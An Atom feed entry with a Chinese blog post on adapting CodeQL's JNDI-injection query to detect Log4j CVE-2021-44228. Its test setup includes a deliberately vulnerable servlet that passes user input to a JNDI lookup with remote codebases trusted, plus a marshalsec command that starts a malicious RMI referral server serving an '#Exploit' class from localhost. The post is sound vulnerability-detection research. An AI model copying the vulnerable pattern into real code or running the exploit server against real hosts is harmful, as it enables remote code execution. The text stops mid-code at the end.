<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4xpl0r3r&#39;s blog</title>
  
  
  <link href="https://cn.4xpl0r3r.com/atom.xml" rel="self"/>
  
  <link href="https://cn.4xpl0r3r.com/"/>
  <updated>2023-02-14T08:50:36.813Z</updated>
  <id>https://cn.4xpl0r3r.com/</id>
  
  <author>
    <name>4xpl0r3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用CodeQL发现Log4j CVE-2021-44228</title>
    <link href="https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/%E4%BD%BF%E7%94%A8CodeQL%E5%8F%91%E7%8E%B0CVE-2021-44228/"/>
    <id>https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/%E4%BD%BF%E7%94%A8CodeQL%E5%8F%91%E7%8E%B0CVE-2021-44228/</id>
    <published>2023-02-14T07:24:26.000Z</published>
    <updated>2023-02-14T08:50:36.813Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>虽然已经有了一个针对”Potential Log4J LDAP JNDI injection (CVE-2021-44228)”的实验性CWE-020 Query，但这次我想改写CWE-074，使其能够发现CVE-2021-44228。</p></blockquote><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供其他语言的版本: <a href="https://4xpl0r3r.com/Experience/Using-CodeQL-to-find-out-Log4j-CVE-2021-44228/">English</a>.</div></article><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>众所周知，Log4j是由受用户控制的JNDI lookup引起的。从文档中，我发现CodeQL Query帮助已经涵盖了它，它的CWE编号是CWE-074。以下是该文档链接:  <a href="https://codeql.github.com/codeql-query-help/java/java-jndi-injection/">JNDI lookup with user-controlled name</a></p><p>让我们一起学习这个CWE，尝试使用它来查找Log4j CVE-2021-44228漏洞</p><p>在本文中，有一些CodeQL专有的术语，我不会将它们转换为中文，但在这里解释一下它们的含义。你也可以在官方的术语库中查阅</p><ul><li>predicate - 类似普通开发语言的函数</li><li>source - 类似于起点</li><li>sink - 类似于终点</li><li>query - 类似SQL的query，也类似脚本语言中的脚本</li></ul><h2 id="解读-CWE-074"><a href="#解读-CWE-074" class="headerlink" title="解读 CWE-074"></a>解读 CWE-074</h2><p>CWE-074代码: <a href="https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-074/JndiInjection.ql">https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-074/JndiInjection.ql</a></p><p>正如我们所看到的，它将大部分代码封装到了<code>semmle.code.java.security.JndiInjectionQuery</code>中</p><p>通过代码中的注释，我们可以知道这个库被用来提供污点跟踪配置，以用于JNDI注入的Query。</p><p>在其中，我们可以发现它需要以下4个库：</p><ul><li><code>semmle.code.java.dataflow.FlowSources</code><ul><li>提供了表示污点跟踪各种数据来源的类和predicate</li><li>这是CodeQL的基本库</li></ul></li><li><code>semmle.code.java.frameworks.Jndi</code><ul><li>提供了用于操作Java JNDI API的类和predicate。</li></ul></li><li><code>semmle.code.java.frameworks.SpringLdap</code><ul><li>提供了用于操作Spring LDAP API的类和predicate</li></ul></li><li><code>semmle.code.java.security.JndiInjection</code><ul><li>提供了用于分析JNDI注入漏洞的类和predicate</li><li>这个对我们很重要，因此我们将分析这个库</li></ul></li></ul><h2 id="解读-JndiInjection-qll"><a href="#解读-JndiInjection-qll" class="headerlink" title="解读 JndiInjection.qll"></a>解读 <code>JndiInjection.qll</code></h2><h4 id="Class-DefaultJndiInjectionSink"><a href="#Class-DefaultJndiInjectionSink" class="headerlink" title="Class DefaultJndiInjectionSink"></a>Class <code>DefaultJndiInjectionSink</code></h4><p>它调用了内部实验性API，在实践中，我发现它可以定位JNDI lookup函数。</p><p>以下是我编写的代码，其作用与<code>sinkNode</code>的调用相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exists(MethodAccess ma, Method m |</span><br><span class="line">  ma.getMethod() = m and</span><br><span class="line">  this.asExpr() = ma.getAnArgument() and</span><br><span class="line">  m.getDeclaringType().hasQualifiedName(&quot;javax.naming&quot;,&quot;Context&quot;) and</span><br><span class="line">  m.hasName(&quot;lookup&quot;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="Class-ConditionedJndiInjectionSink"><a href="#Class-ConditionedJndiInjectionSink" class="headerlink" title="Class ConditionedJndiInjectionSink"></a>Class <code>ConditionedJndiInjectionSink</code></h4><p>该类扩展了<code>JndiInjectionSink</code>和<code>DataFlow::ExprNode</code>，因此它既是一个<code>Node</code>，也是一个<code>ExprNode</code>。</p><p>以下是CodeQL判断代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exists(MethodAccess ma, Method m |</span><br><span class="line">      ma.getMethod() = m and</span><br><span class="line">      ma.getArgument(0) = this.asExpr() and</span><br><span class="line">      m.getDeclaringType().getASourceSupertype*() instanceof TypeLdapOperations</span><br><span class="line">    |</span><br><span class="line">      m.hasName(&quot;search&quot;) and</span><br><span class="line">      ma.getArgument(3).(CompileTimeConstantExpr).getBooleanValue() = true</span><br><span class="line">      or</span><br><span class="line">      m.hasName(&quot;unbind&quot;) and</span><br><span class="line">      ma.getArgument(1).(CompileTimeConstantExpr).getBooleanValue() = true</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>Let’s divide it into 3 parts by the <code>|</code> operand .</p><p>我们通过<code>|</code>运算符将其分为3个部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MethodAccess ma, Method m</span><br></pre></td></tr></table></figure><p>首先是一个方法访问和方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ma.getMethod() = m and</span><br><span class="line">ma.getArgument(0) = this.asExpr() and</span><br><span class="line">m.getDeclaringType().getASourceSupertype*() instanceof TypeLdapOperations</span><br></pre></td></tr></table></figure><p>该方法访问了<code>m</code>方法，作为表达式的sink是<code>m</code>方法的第一个参数，而这个方法是LDAP操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m.hasName(&quot;search&quot;) and</span><br><span class="line">ma.getArgument(3).(CompileTimeConstantExpr).getBooleanValue() = true</span><br><span class="line">or</span><br><span class="line">m.hasName(&quot;unbind&quot;) and</span><br><span class="line">ma.getArgument(1).(CompileTimeConstantExpr).getBooleanValue() = true</span><br></pre></td></tr></table></figure><p>该方法可以是<code>search</code>方法，在编译时它的第三个参数应该是<code>true</code>；或者该方法可以是<code>unbind</code>方法，在编译时它的第一个参数应该是<code>true</code>。</p><p>这是什么意思？我们可以在真实的代码中查看一下。</p><p><code>TypeLdapOperations</code> 包含2个类</p><ul><li><code>org.springframework.ldap.core</code></li><li><code>org.springframework.ldap</code></li></ul><p>所以这只是针对具有<code>SpringFramework</code>的情况，但是这一次，我想找到一个更通用的条件，而不需要任何框架。不过，下次分析这一点也是一个不错的想法。</p><h4 id="Class-ProviderUrlJndiInjectionSink"><a href="#Class-ProviderUrlJndiInjectionSink" class="headerlink" title="Class ProviderUrlJndiInjectionSink"></a>Class <code>ProviderUrlJndiInjectionSink</code></h4><p>正如注释所说，它可以找到关于PROVIDER_URL的sink。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Tainted value passed to env `Hashtable` as the provider URL by calling</span><br><span class="line"> * `env.put(Context.PROVIDER_URL, tainted)` or `env.setProperty(Context.PROVIDER_URL, tainted)`.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">exists(MethodAccess ma, Method m |</span><br><span class="line">  ma.getMethod() = m and</span><br><span class="line">  ma.getArgument(1) = this.getExpr()</span><br><span class="line">|</span><br><span class="line">  m.getDeclaringType().getASourceSupertype*() instanceof TypeHashtable and</span><br><span class="line">  (m.hasName(&quot;put&quot;) or m.hasName(&quot;setProperty&quot;)) and</span><br><span class="line">  (</span><br><span class="line">    ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;java.naming.provider.url&quot;</span><br><span class="line">    or</span><br><span class="line">    exists(Field f |</span><br><span class="line">      ma.getArgument(0) = f.getAnAccess() and</span><br><span class="line">      f.hasName(&quot;PROVIDER_URL&quot;) and</span><br><span class="line">      f.getDeclaringType() instanceof TypeNamingContext</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>m.getDeclaringType().getASourceSupertype*() instanceof TypeHashtable</code> 表示<code>m</code> 应该是 <code>java.util.Hashtable</code>的子类</p><p><code>(m.hasName(&quot;put&quot;) or m.hasName(&quot;setProperty&quot;))</code> 指定了方法的名称</p><p>最后一部分指示第一个参数应该是一个字符串<code>java.naming.provider.url</code>或者是一个类型为<code>javax.naming.Context</code>的字段，且名称应为<code>PROVIDER_URL</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;java.naming.provider.url&quot;</span><br><span class="line">  or</span><br><span class="line">  exists(Field f |</span><br><span class="line">    ma.getArgument(0) = f.getAnAccess() and</span><br><span class="line">    f.hasName(&quot;PROVIDER_URL&quot;) and</span><br><span class="line">    f.getDeclaringType() instanceof TypeNamingContext</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因此，显然，如果用户输入只能控制PROVIDER_URL，则此Query仍然可以找到它。</p><h4 id="Class-DefaultJndiInjectionAdditionalTaintStep"><a href="#Class-DefaultJndiInjectionAdditionalTaintStep" class="headerlink" title="Class DefaultJndiInjectionAdditionalTaintStep"></a>Class <code>DefaultJndiInjectionAdditionalTaintStep</code></h4><blockquote><p>这是一组在跟踪JNDI注入相关数据流的污点时需要考虑的额外污点步骤，以避免在调用第三方包时出现污点跟踪中断。</p></blockquote><ul><li><code>nameStep(node1, node2)</code> 表示 <code>n1</code> 到 <code>n2</code> 是一个数据流步骤，通过调用 <code>new CompositeName(tainted)</code> 或 <code>new CompoundName(tainted)</code> 在 <code>String</code> 和 <code>CompositeName</code> 或 <code>CompoundName</code> 之间进行转换。</li><li><code>nameAddStep(node1, node2)</code> 表示 <code>n1</code> 到 <code>n2</code> 是一个数据流步骤，通过调用 <code>new CompositeName().add(tainted)</code> 或 <code>new CompoundName().add(tainted)</code> 在 <code>String</code> 和 <code>CompositeName</code> 或 <code>CompoundName</code> 之间进行转换。</li><li><code>jmxServiceUrlStep(node1, node2)</code> 表示 <code>n1</code> 到 <code>n2</code> 是一个数据流步骤，通过调用 <code>new JMXServiceURL(tainted)</code> 在 <code>String</code> 和 <code>JMXServiceURL</code> 之间进行转换。</li><li><code>jmxConnectorStep(node1, node2)</code> 表示 <code>n1</code> 到 <code>n2</code> 是一个数据流步骤，通过调用 <code>JMXConnectorFactory.newJMXConnector(tainted)</code> 在 <code>JMXServiceURL</code> 和 <code>JMXConnector</code> 之间进行转换。</li><li><code>rmiConnectorStep(node1, node2)</code> 表示 <code>n1</code> 到 <code>n2</code> 是一个数据流步骤，通过调用 <code>new RMIConnector(tainted)</code> 在 <code>JMXServiceURL</code> 和 <code>RMIConnector</code> 之间进行转换。</li></ul><h3 id="解读JndiInjectionQuery-qll"><a href="#解读JndiInjectionQuery-qll" class="headerlink" title="解读JndiInjectionQuery.qll"></a>解读<code>JndiInjectionQuery.qll</code></h3><p>现在，让我们进入“query”库，这里包含了一些关于如何进行全局污点追踪的信息</p><h4 id="Class-JndiInjectionFlowConfig"><a href="#Class-JndiInjectionFlowConfig" class="headerlink" title="Class JndiInjectionFlowConfig"></a>Class <code>JndiInjectionFlowConfig</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class JndiInjectionFlowConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  JndiInjectionFlowConfig() &#123; this = &quot;JndiInjectionFlowConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof JndiInjectionSink &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    any(JndiInjectionAdditionalTaintStep c).step(node1, node2)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它将 <code>JndiInjectionSink</code> 应用为 Sink 进行跟踪。</p><p><code>isSanitizer</code> 定义了应该删除结果的条件，在这种情况下，如果节点是原始类型或包装原始类型（BoxedType），则会将其删除。</p><p><code>isAdditionalTaintStep</code> 添加了额外的污点步骤，在这种情况下，它使用 <code>JndiInjectionAdditionalTaintStep</code>，使用这个库时，<code>any</code> 过滤器表示我们将使用任何可用的子类，在这里我们将使用已经解释过的 <code>DefaultJndiInjectionAdditionalTaintStep</code> 类。</p><h4 id="Class-UnsafeSearchControlsSink"><a href="#Class-UnsafeSearchControlsSink" class="headerlink" title="Class UnsafeSearchControlsSink"></a>Class <code>UnsafeSearchControlsSink</code></h4><blockquote><p>一个当接收到一个 <code>setReturningObjFlag</code> 属性为 <code>true</code> 的 <code>SearchControls</code> 参数时执行 JNDI lookup的方法。</p></blockquote><p>这个类定义了不安全的 Search Controls Sink。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exists(UnsafeSearchControlsConf conf, MethodAccess ma |</span><br><span class="line">  conf.hasFlowTo(DataFlow::exprNode(ma.getAnArgument()))</span><br><span class="line">|</span><br><span class="line">  this.asExpr() = ma.getArgument(0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>正如我们所看到的，它需要 <code>UnsafeSearchControlsConf</code>，它定义了数据流的Source和 Sink，Source应该是 <code>UnsafeSearchControls</code>，Sink 应该是 <code>UnsafeSearchControlsArgument</code>。</p><ul><li><code>UnsafeSearchControls</code>：一个带有 <code>setReturningObjFlag</code> = <code>true</code> 的 <code>SearchControls</code> 对象。<ul><li><a href="https://docs.oracle.com/javase/8/docs/api/javax/naming/directory/SearchControls.html">https://docs.oracle.com/javase/8/docs/api/javax/naming/directory/SearchControls.html</a></li><li><code>setReturningObjFlag</code> 启用/禁用作为结果的一部分返回的对象。</li></ul></li><li><code>UnsafeSearchControlsArgument</code>：一个 <code>LdapOperations.search</code> 或 <code>DirContext.search</code> 调用的类型为 <code>SearchControls</code> 的参数。</li></ul><p>因此，Sink 应该是方法访问的第一个参数，方法访问的一个参数将按照 <code>UnsafeSearchControlsConf</code> 中定义的规则进行污染。</p><h2 id="使用Java代码测试JndiInjection-ql"><a href="#使用Java代码测试JndiInjection-ql" class="headerlink" title="使用Java代码测试JndiInjection.ql"></a>使用Java代码测试<code>JndiInjection.ql</code></h2><p><code>JndiInjection.ql</code> 只是简单地使用 <code>JndiInjectionFlowConfig</code> 调用了路径的Query。</p><p>这是测试代码，其中部分代码从官方演示中提取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>); <span class="comment">// necessary for Java 8</span></span><br><span class="line">    String name = request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> Hashtable&lt;String, String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>); <span class="comment">// 匹配 ProviderUrlJndiInjectionSink</span></span><br><span class="line">    InitialContext ctx = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BAD: User input used in lookup</span></span><br><span class="line">        ctx.lookup(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// GOOD: The name is validated before being used in lookup</span></span><br><span class="line"><span class="comment">//          if (isValid(name)) &#123;</span></span><br><span class="line"><span class="comment">//              ctx.lookup(name);</span></span><br><span class="line"><span class="comment">//          &#125; else &#123;</span></span><br><span class="line"><span class="comment">//              // Reject the request</span></span><br><span class="line"><span class="comment">//          &#125;</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:4444/\<span class="comment">#Exploit 1099</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdk8</span><br><span class="line">codeql database create cwe074-test --language=java --source-root=/Users/kano/Workspace/IdeaProjects/demo12</span><br></pre></td></tr></table></figure><p><img src="image-20230211221440882.png" alt="image-20230211221440882"></p><p>我们得到了预期的结果. 我们可以使用 Quick evaluation 功能来验证之前的分析</p><ul><li><code>DefaultJndiInjectionSink</code> 找到了<code>String name = request.getParameter(&quot;name&quot;);</code></li><li><code>ProviderUrlJndiInjectionSink</code> 找到了<code>env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;);</code></li></ul><p>事实证明这些Query工作得非常好</p><h2 id="前进到-Log4j-CVE-2021-44228"><a href="#前进到-Log4j-CVE-2021-44228" class="headerlink" title="前进到 Log4j CVE-2021-44228"></a>前进到 Log4j CVE-2021-44228</h2><p>引入<code>org.apache.logging.log4j-2.14.1</code>，你可以在这里找到它 <a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.14.1">here</a></p><h3 id="为CodeQL准备数据库"><a href="#为CodeQL准备数据库" class="headerlink" title="为CodeQL准备数据库"></a>为CodeQL准备数据库</h3><p>配置<code>toolchains-sample-*.xml</code>后，我们可以得到CodeQL数据库。 </p><p>为了获得更好的性能，我们可以在“modules”部分排除无用的项目。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;modules&gt;</span><br><span class="line">    &lt;module&gt;log4j-api-java9&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-api&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-core-java9&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-core&lt;/module&gt;</span><br><span class="line">    &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-core-its&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jcl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-taglib&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-samples&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-bom&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jpa&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-couchdb&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-mongodb3&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-cassandra&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-web&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-perf&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-iostreams&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jul&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jpl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-liquibase&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-appserver&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-osgi&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-docker&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span><br><span class="line">  &lt;/modules&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create log4j-db -l java -s logging-log4j2-rel-2.14.1/ -c <span class="string">&#x27;./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=true&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="找到source"><a href="#找到source" class="headerlink" title="找到source"></a>找到source</h3><p>通过调试，我们可以知道用户输入源位于<code>log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java</code>中的各个日志函数，比如<code>debug</code>， <code>info</code>、<code>error</code> 和它们都将调用带有messag或messageSupplier作为日志消息的 logIfEnabled 函数。</p><p>所以源码应该是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Log4jFlowSource extends DataFlow::Node&#123;</span><br><span class="line">  Log4jFlowSource()&#123;</span><br><span class="line">    this.asParameter().getCallable().hasName(&quot;logIfEnabled&quot;) and</span><br><span class="line">    (</span><br><span class="line">      this.asParameter().hasName(&quot;message&quot;) or</span><br><span class="line">      this.asParameter().hasName(&quot;messageSupplier&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且我需要添加一个新的 <code>TaintTracking::Configuration</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class JndiInjectionFlowConfigInLog4j extends TaintTracking::Configuration&#123;</span><br><span class="line">  JndiInjectionFlowConfigInLog4j() &#123; this = &quot;JndiInjectionFlowConfigInLog4j&quot; &#125;</span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof Log4jFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof JndiInjectionSink &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    any(JndiInjectionAdditionalTaintStep c).step(node1, node2)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::PathNode source, DataFlow::PathNode sink, JndiInjectionFlowConfigInLog4j conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;JNDI lookup might include name from $@.&quot;, source.getNode(),</span><br><span class="line">  &quot;this user input&quot;</span><br></pre></td></tr></table></figure><p>只需要改变 <code>isSource</code> 部分其他部分与 <code>JndiInjectionFlowConfig</code>相同</p><p>运行Query，我们得到如下结果</p><p><img src="image-20230212233802283.png" alt="image-20230212233802283"></p><p><img src="image-20230212233811480.png" alt="image-20230212233811480"></p><p>运气不错，我们成功找到一条路径，证明用户输入可以传递给 JNDI lookup。 完整代码如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 